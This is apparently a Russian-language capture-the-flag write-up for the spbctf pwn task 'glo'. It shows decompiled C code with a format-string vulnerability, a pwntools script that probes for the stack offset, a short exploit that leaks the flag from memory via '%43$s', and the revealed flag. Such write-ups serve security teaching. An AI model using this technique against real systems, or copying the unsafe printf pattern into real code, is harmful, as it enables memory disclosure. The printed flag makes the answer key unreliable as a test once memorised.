[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn5_glo)
Описание:
Here is glo service
`nc 109.233.56.90 11690`
**[glo.elf](https://pwn.spbctf.ru/files/www/glo/glo.elf)**

Код:
``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  char format[256]; // [rsp+0h] [rbp-150h] BYREF
  char password[32]; // [rsp+100h] [rbp-50h] BYREF
  char login[40]; // [rsp+120h] [rbp-30h] BYREF
  FILE *stream; // [rsp+148h] [rbp-8h]

  setvbuf(stdout, nullptr, 2, 0);
  stream = fopen("flag.txt", "r");
  fread(&flag, 0x400u, 1u, stream);
  fclose(stream);

  puts("Welcome to GLO");
  puts("Enter login");
  fgets(login, 32, stdin);
  strip((__int64)login, 32);
  snprintf(format, 256u, ::format, login);

  puts("Enter password");
  fgets(password, 32, stdin);
  strip((__int64)password, 32);
  printf(format, password);
}
```

Для начала необходимо найти смещение в стеке, куда записывается буфер:
``` python
for i in range(100):
    io = start()

    io.recvline()
    io.recvline()
    payload = f'AAAAAAAA.%{i}$p'
    io.sendline(payload)
    io.recvline()
    io.sendline()
    io.recvline()

    s = io.recvline().decode()
    io.recvline()
    io.recvline()

    if '41' * 8 in s:
        print(i, s)
        break
```
![{4A0B64BF-C953-4801-9913-E065531B7939}](../../../../z.%20Images/{4A0B64BF-C953-4801-9913-E065531B7939}.png)

Теперь необходимо считать флаг по адресу в памяти.
Эксплоит:
``` python
n = 42
flag = 0x4040A0

io = start()

payload = flat({
    0x0: f'%{n+1}$s'.encode(),
    0x08: p64(flag)
})
io.sendline(payload)
io.sendline()

io.interactive()
```

Запуск:
![{0852A0EC-9CD1-4927-95F9-68B861F5083A}](../../../../z.%20Images/{0852A0EC-9CD1-4927-95F9-68B861F5083A}.png)

Ответ: `SPBCTF{R34D_U51N_F53}`